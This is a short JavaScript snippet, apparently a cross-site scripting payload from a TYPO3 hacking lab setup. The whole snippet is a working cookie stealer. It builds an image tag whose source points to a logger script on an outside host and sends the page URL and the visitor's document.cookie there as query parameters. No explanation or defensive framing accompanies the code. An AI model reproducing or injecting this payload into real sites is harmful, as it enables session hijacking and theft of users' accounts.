(function() {
    var img = document.createElement('img');
    img.setAttribute('src', 'http://typo3v9-hack.ddev.site/logger/log.php'
        + '?u=' + location.href
        + '&l=' + JSON.stringify({'cookies': document.cookie}));
    document.body.append(img);
})();